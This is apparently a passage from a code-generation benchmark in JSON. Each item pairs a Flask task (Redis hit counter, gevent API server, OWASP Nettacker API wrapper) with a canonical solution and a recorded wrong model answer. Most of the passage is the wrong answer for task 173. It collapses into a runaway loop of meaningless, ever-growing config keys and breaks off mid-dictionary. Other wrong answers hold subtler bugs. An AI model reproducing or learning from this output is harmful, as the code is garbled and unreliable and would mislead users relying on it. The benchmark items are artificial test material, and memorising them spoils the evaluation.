    "wrong_result": "```python\nimport sys\nimport threading\nimport webbrowser\nfrom flask import Flask, render_template, jsonify\n\ndef trace(files=None, port=9999, host='127.0.0.1', browser=False, daemon=False):\n    app = Flask(__name__)\n\n    @app.route('/')\n    def index():\n        return render_template('index.html')\n\n    @app.route('/trace')\n    def get_trace():\n        return jsonify(trace_data)\n\n    def trace_calls(frame, event, arg):\n        if event != 'line':\n            return\n        code = frame.f_code\n        filename = code.co_filename\n        if files and not any(filename.endswith(f) for f in files):\n            return\n        line_no = frame.f_lineno\n        trace_data[line_no] = trace_data.get(line_no, 0) + 1\n        return trace_calls\n\n    trace_data = {}\n    sys.settrace(trace_calls)\n\n    def run_server():\n        app.run(port=port, host=host)\n\n    server_thread = threading.Thread(target=run_server)\n    server_thread.daemon = daemon\n    server_thread.start()\n\n    if browser:\n        webbrowser.open(f'http://{host}:{port}')\n\n    server_thread.join()\n```"
  },
  {
    "Task_id": 170,
    "Instruction": "Task Description: Create a simple web application using Flask that interacts with Redis to track and display the number of times the homepage has been accessed.\n\nFunction Description: The function `hello()` is a Flask route handler for the root URL ('/'). It increments a counter in Redis each time the route is accessed and returns a greeting message along with the current count of visits.\n\nInput: \n- None (The function handles HTTP GET requests to the root URL without requiring explicit input parameters)\n\nOutput: \n- A string response containing \"Hello World!\" followed by the current visit count in the format: \"Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {count} \u6b21\u3002\\n\" where {count} is the number of times the page has been accessed.",
    "Canonical_solution": "from flask import Flask\nfrom redis import Redis\n\napp = Flask(__name__)\nredis = Redis(host='redis', port=6379)\n\n@app.route('/')\ndef hello():\n    count = redis.incr('hits')\n    return 'Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {} \u6b21\u3002\\n'.format(count)\n\nif __name__ == \"__main__\":\n    app.run(host=\"0.0.0.0\", debug=True)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask\nimport redis\n\napp = Flask(__name__)\nr = redis.Redis(host='localhost', port=6379, db=0)\n\n@app.route('/')\ndef hello():\n    count = r.incr('visit_count')\n    return f\"Hello World! \u8be5\u9875\u9762\u5df2\u88ab\u8bbf\u95ee {count} \u6b21\u3002\\n\"\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```"
  },
  {
    "Task_id": 172,
    "Instruction": "Task Description: Create a Python class that implements an API server using Flask and gevent WSGI server, capable of serving web UI and handling REST API requests with proper error handling.\n\nClass Description: APIServer is a class that encapsulates a Flask web server with gevent WSGI capabilities. It handles server lifecycle management, web UI serving, and error handling for REST API endpoints.\n\nAttributes:\n- stop_event: [Event] - A gevent event used to signal server shutdown\n- config: [RestApiConfig] - Configuration object containing server settings (host, port, etc.)\n- rest_api: [RestAPI] - Reference to the main REST API implementation\n- wsgiserver: [Optional[WSGIServer]] - The gevent WSGI server instance\n- flask_app: [Flask] - The Flask application instance\n\nMethods:\n- __init__(rest_api: \"RestAPI\", config: RestApiConfig, eth_rpc_endpoint: str = None) -> None - Initializes the API server with configuration and dependencies\n- _serve_webui(file_name: str = \"index.html\") -> Response - Serves web UI files from configured directory (handles fallback to index.html)\n- _run() -> None - Internal method to run the WSGI server indefinitely\n- start() -> None - Starts the API server and initializes the WSGI server\n- stop() -> None - Stops the API server gracefully\n- unhandled_exception(exception: Exception) -> Response - Global exception handler that returns error responses and logs critical errors",
    "Canonical_solution": "import errno\nimport logging\nimport socket\nfrom typing import Optional\n\nimport gevent\nimport gevent.pool\nfrom flask import Flask\nfrom gevent.event import Event\nfrom gevent.pywsgi import WSGIServer\nfrom werkzeug.exceptions import NotFound\n\nclass APIServer:\n    def __init__(\n        self,\n        rest_api: \"RestAPI\",\n        config: RestApiConfig,\n        eth_rpc_endpoint: str = None,\n    ) -> None:\n        self.stop_event = Event()\n        self.config = config\n        self.rest_api = rest_api\n        self.wsgiserver: Optional[WSGIServer] = None\n\n        flask_app = Flask(__name__)\n        self.flask_app = flask_app\n\n        self.flask_app.register_error_handler(HTTPStatus.NOT_FOUND, endpoint_not_found)\n        self.flask_app.register_error_handler(Exception, self.unhandled_exception)\n\n        if config.web_ui_enabled:\n            for route in (\"/ui/<path:file_name>\", \"/ui\", \"/ui/\", \"/index.html\", \"/\"):\n                self.flask_app.add_url_rule(\n                    route, route, view_func=self._serve_webui, methods=(\"GET\",)\n                )\n\n    def _serve_webui(self, file_name: str = \"index.html\") -> Response:\n        try:\n            if not file_name:\n                raise NotFound\n\n            response = send_from_directory(self.flask_app.config[\"WEBUI_PATH\"], file_name)\n        except (NotFound, AssertionError):\n            if file_name.endswith(\".json\"):\n                response = api_error(\n                    \"Service unavailable, try again later\", HTTPStatus.SERVICE_UNAVAILABLE\n                )\n            else:\n                response = send_from_directory(self.flask_app.config[\"WEBUI_PATH\"], \"index.html\")\n        return response\n\n    def _run(self) -> None:\n        try:\n            if self.wsgiserver is not None:\n                self.wsgiserver.serve_forever()\n        except gevent.GreenletExit:\n            raise\n        except Exception:\n            self.stop()\n            raise\n\n    def start(self) -> None:\n        self.stop_event.clear()\n\n        wsgi_log = logging.getLogger(__name__ + \".pywsgi\")\n        pool = gevent.pool.Pool()\n        wsgiserver = WSGIServer(\n            (self.config.host, self.config.port),\n            self.flask_app,\n            log=wsgi_log,\n            error_log=wsgi_log,\n            spawn=pool,\n        )\n\n        try:\n            wsgiserver.init_socket()\n        except socket.error as e:\n            if e.errno == errno.EADDRINUSE:\n                raise APIServerPortInUseError(f\"{self.config.host}:{self.config.port}\")\n            raise\n\n        self.wsgiserver = wsgiserver\n        super().start()\n\n    def stop(self) -> None:\n        self.stop_event.set()\n\n        if self.wsgiserver is not None:\n            self.wsgiserver.stop(timeout=5)\n            self.wsgiserver = None\n\n    def unhandled_exception(self, exception: Exception) -> Response:\n        log.critical(\n            \"Unhandled exception when processing endpoint request\",\n            exc_info=True,\n            node=self.rest_api.checksum_address,\n        )\n        self.greenlet.kill(exception)\n        return api_error([str(exception)], HTTPStatus.INTERNAL_SERVER_ERROR)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, Response, request\nfrom gevent.pywsgi import WSGIServer\nfrom gevent.event import Event\nfrom typing import Optional\nfrom .config import RestApiConfig\nfrom .rest_api import RestAPI\n\nclass APIServer:\n    def __init__(self, rest_api: \"RestAPI\", config: RestApiConfig, eth_rpc_endpoint: str = None) -> None:\n        self.stop_event = Event()\n        self.config = config\n        self.rest_api = rest_api\n        self.wsgiserver: Optional[WSGIServer] = None\n        self.flask_app = Flask(__name__)\n\n    def _serve_webui(self, file_name: str = \"index.html\") -> Response:\n        try:\n            with open(f\"{self.config.web_ui_dir}/{file_name}\", \"r\") as f:\n                return Response(f.read(), mimetype=\"text/html\")\n        except FileNotFoundError:\n            return self._serve_webui()\n\n    def _run(self) -> None:\n        self.wsgiserver = WSGIServer((self.config.host, self.config.port), self.flask_app)\n        self.wsgiserver.serve_forever()\n\n    def start(self) -> None:\n        self.flask_app.add_url_rule(\"/\", \"webui\", self._serve_webui)\n        self.flask_app.add_url_rule(\"/api/<path:path>\", \"api\", self.rest_api.handle_request)\n        self.flask_app.register_error_handler(Exception, self.unhandled_exception)\n        self._run()\n\n    def stop(self) -> None:\n        self.stop_event.set()\n        self.wsgiserver.stop()\n\n    def unhandled_exception(self, exception: Exception) -> Response:\n        self.config.logger.critical(f\"Unhandled exception: {exception}\")\n        return Response(f\"Unhandled exception: {exception}\", status=500)\n```\n"
  },
  {
    "Task_id": 173,
    "Instruction": "Task Description: Create a Flask-based API server for the OWASP Nettacker security tool that handles scan requests, retrieves results, and manages logs through HTTP endpoints.\n\nClass Description: The NettackerAPI class implements a RESTful API service using Flask framework to control and interact with the OWASP Nettacker security scanning tool. It provides endpoints for initiating scans, retrieving results in JSON format, and accessing scan logs.\n\nAttributes:\n- app: [Flask] - The Flask application instance\n- options: [SimpleNamespace] - Configuration options for the API server\n- app.config[\"OWASP_NETTACKER_CONFIG\"]: [dict] - Configuration dictionary containing API security settings and options\n\nMethods:\n- __init__(options) -> [None] - Initializes the Flask app with configuration options\n- _setup_routes() -> [None] - Defines all API endpoints and their handlers\n- _sanitize_report_path_filename(report_path_filename) -> [Path|bool] - Sanitizes and validates report filenames\n- run() -> [None] - Starts the Flask server with SSL/TLS configuration\n- start_api_server() -> [None] - Runs the API server in a separate process\n\nEndpoint Methods:\n- new_scan() -> [Response] - Handles POST requests to start new scans (returns scan arguments or error)\n- get_results_json() -> [Response] - Retrieves scan results in JSON format (returns file download)\n- get_logs() -> [Response] - Retrieves scan logs in JSON format (returns file download)",
    "Canonical_solution": "from flask import Flask, jsonify, request as flask_request, Response, make_response\nfrom werkzeug.utils import secure_filename\nimport os\nimport json\nimport csv\nimport random\nimport string\nimport multiprocessing\nimport time\nfrom threading import Thread\nfrom types import SimpleNamespace\n\nclass NettackerAPI:\n    def __init__(self, options):\n        self.app = Flask(__name__, template_folder=str(options.web_static_dir))\n        self.app.config[\"OWASP_NETTACKER_CONFIG\"] = {\n            \"api_access_key\": options.api_access_key,\n            \"api_client_whitelisted_ips\": options.api_client_whitelisted_ips,\n            \"api_access_log\": options.api_access_log,\n            \"api_cert\": options.api_cert,\n            \"api_cert_key\": options.api_cert_key,\n            \"language\": options.language,\n            \"options\": options,\n        }\n        \n        self._setup_routes()\n        self.options = options\n\n    def _setup_routes(self):\n        @self.app.route(\"/new/scan\", methods=[\"GET\", \"POST\"])\n        def new_scan():\n            api_key_is_valid(self.app, flask_request)\n            form_values = dict(flask_request.form)\n            raw_report_path_filename = form_values.get(\"report_path_filename\")\n            report_path_filename = self._sanitize_report_path_filename(raw_report_path_filename)\n            if not report_path_filename:\n                return jsonify(structure(status=\"error\", msg=\"Invalid report filename\")), 400\n            form_values[\"report_path_filename\"] = str(report_path_filename)\n            for key in nettacker_application_config:\n                if key not in form_values:\n                    form_values[key] = nettacker_application_config[key]\n\n            nettacker_app = Nettacker(api_arguments=SimpleNamespace(**form_values))\n            self.app.config[\"OWASP_NETTACKER_CONFIG\"][\"options\"] = nettacker_app.arguments\n            thread = Thread(target=nettacker_app.run)\n            thread.start()\n\n            return jsonify(vars(nettacker_app.arguments)), 200\n\n        @self.app.route(\"/results/get_json\", methods=[\"GET\"])\n        def get_results_json():\n            api_key_is_valid(self.app, flask_request)\n            session = create_connection()\n            result_id = get_value(flask_request, \"id\")\n            if not result_id:\n                return jsonify(structure(status=\"error\", msg=_(\"invalid_scan_id\"))), 400\n            scan_details = session.query(Report).filter(Report.id == result_id).first()\n            json_object = json.dumps(get_logs_by_scan_id(scan_details.scan_unique_id))\n            filename = \".\".join(scan_details.report_path_filename.split(\".\")[:-1])[1:] + \".json\"\n            return Response(\n                json_object,\n                mimetype=\"application/json\",\n                headers={\"Content-Disposition\": \"attachment;filename=\" + filename},\n            )\n\n        @self.app.route(\"/logs/get_json\", methods=[\"GET\"])\n        def get_logs():\n            api_key_is_valid(self.app, flask_request)\n            target = get_value(flask_request, \"target\")\n            data = logs_to_report_json(target)\n            json_object = json.dumps(data)\n            filename = (\n                \"report-\"\n                + now(format=\"%Y_%m_%d_%H_%M_%S\")\n                + \"\".join(random.choice(string.ascii_lowercase) for _ in range(10))\n            )\n            return Response(\n                json_object,\n                mimetype=\"application/json\",\n                headers={\"Content-Disposition\": \"attachment;filename=\" + filename + \".json\"},\n            )\n\n    def _sanitize_report_path_filename(self, report_path_filename):\n        filename = secure_filename(os.path.basename(report_path_filename))\n        if not filename:\n            return False\n        VALID_EXTENSIONS = (\".html\", \".htm\", \".txt\", \".json\", \".csv\")\n        if \".\" in filename:\n            if filename.endswith(VALID_EXTENSIONS):\n                safe_report_path = nettacker_path_config.results_dir / filename\n            else:\n                return False\n        else:\n            safe_report_path = nettacker_path_config.results_dir / filename\n        if not safe_report_path.is_relative_to(nettacker_path_config.results_dir):\n            return False\n        return safe_report_path\n\n    def run(self):\n        if self.options.api_cert and self.options.api_cert_key:\n            self.app.run(\n                host=self.options.api_hostname,\n                port=self.options.api_port,\n                debug=self.options.api_debug_mode,\n                ssl_context=(self.options.api_cert, self.options.api_cert_key),\n                threaded=True,\n            )\n        else:\n            self.app.run(\n                host=self.options.api_hostname,\n                port=self.options.api_port,\n                debug=self.options.api_debug_mode,\n                ssl_context=\"adhoc\",\n                threaded=True,\n            )\n\n    def start_api_server(self):\n        p = multiprocessing.Process(target=self.run)\n        p.start()\n        while len(multiprocessing.active_children()) != 0:\n            try:\n                time.sleep(0.3)\n            except KeyboardInterrupt:\n                for process in multiprocessing.active_children():\n                    process.terminate()\n                break",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request, send_file, jsonify\nfrom pathlib import Path\nfrom types import SimpleNamespace\nimport subprocess\nimport json\n\nclass NettackerAPI:\n    def __init__(self, options):\n        self.app = Flask(__name__)\n        self.options = options\n        self.app.config[\"OWASP_NETTACKER_CONFIG\"] = {\n            \"api_key\": options.api_key,\n            \"api_secret\": options.api_secret,\n            \"api_host\": options.api_host,\n            \"api_port\": options.api_port,\n            \"api_ssl\": options.api_ssl,\n            \"api_cert\": options.api_cert,\n            \"api_keyfile\": options.api_keyfile,\n            \"api_log\": options.api_log,\n            \"api_log_level\": options.api_log_level,\n            \"api_log_file\": options.api_log_file,\n            \"api_log_file_level\": options.api_log_file_level,\n            \"api_log_file_max_bytes\": options.api_log_file_max_bytes,\n            \"api_log_file_backup_count\": options.api_log_file_backup_count,\n            \"api_log_file_encoding\": options.api_log_file_encoding,\n            \"api_log_file_delay\": options.api_log_file_delay,\n            \"api_log_file_json\": options.api_log_file_json,\n            \"api_log_file_json_indent\": options.api_log_file_json_indent,\n            \"api_log_file_json_sort_keys\": options.api_log_file_json_sort_keys,\n            \"api_log_file_json_dumps_kwargs\": options.api_log_file_json_dumps_kwargs,\n            \"api_log_file_json_dumps_kwargs_indent\": options.api_log_file_json_dumps_kwargs_indent,\n            \"api_log_file_json_dumps_kwargs_sort_keys\": options.api_log_file_json_dumps_kwargs_sort_keys,\n            \"api_log_file_json_dumps_kwargs_default\": options.api_log_file_json_dumps_kwargs_default,\n            \"api_log_file_json_dumps_kwargs_default_str\": options.api_log_file_json_dumps_kwargs_default_str,\n            \"api_log_file_json_dumps_kwargs_default_bytes\": options.api_log_file_json_dumps_kwargs_default_bytes,\n            \"api_log_file_json_dumps_kwargs_default_float\": options.api_log_file_json_dumps_kwargs_default_float,\n            \"api_log_file_json_dumps_kwargs_default_int\": options.api_log_file_json_dumps_kwargs_default_int,\n            \"api_log_file_json_dumps_kwargs_default_complex\": options.api_log_file_json_dumps_kwargs_default_complex,\n            \"api_log_file_json_dumps_kwargs_default_dict\": options.api_log_file_json_dumps_kwargs_default_dict,\n            \"api_log_file_json_dumps_kwargs_default_list\": options.api_log_file_json_dumps_kwargs_default_list,\n            \"api_log_file_json_dumps_kwargs_default_tuple\": options.api_log_file_json_dumps_kwargs_default_tuple,\n            \"api_log_file_json_dumps_kwargs_default_set\": options.api_log_file_json_dumps_kwargs_default_set,\n            \"api_log_file_json_dumps_kwargs_default_frozenset\": options.api_log_file_json_dumps_kwargs_default_frozenset,\n            \"api_log_file_json_dumps_kwargs_default_bool\": options.api_log_file_json_dumps_kwargs_default_bool,\n            \"api_log_file_json_dumps_kwargs_default_none\": options.api_log_file_json_dumps_kwargs_default_none,\n            \"api_log_file_json_dumps_kwargs_default_type\": options.api_log_file_json_dumps_kwargs_default_type,\n            \"api_log_file_json_dumps_kwargs_default_function\": options.api_log_file_json_dumps_kwargs_default_function,\n            \"api_log_file_json_dumps_kwargs_default_method\": options.api_log_file_json_dumps_kwargs_default_method,\n            \"api_log_file_json_dumps_kwargs_default_class\": options.api_log_file_json_dumps_kwargs_default_class,\n            \"api_log_file_json_dumps_kwargs_default_module\": options.api_log_file_json_dumps_kwargs_default_module,\n            \"api_log_file_json_dumps_kwargs_default_import\": options.api_log_file_json_dumps_kwargs_default_import,\n            \"api_log_file_json_dumps_kwargs_default_importlib\": options.api_log_file_json_dumps_kwargs_default_importlib,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            \"api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources\": options.api_log_file_json_dumps_kwargs_default_importlib_resources_package_resources_package_resources_package_resources_package_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources_resources,\n            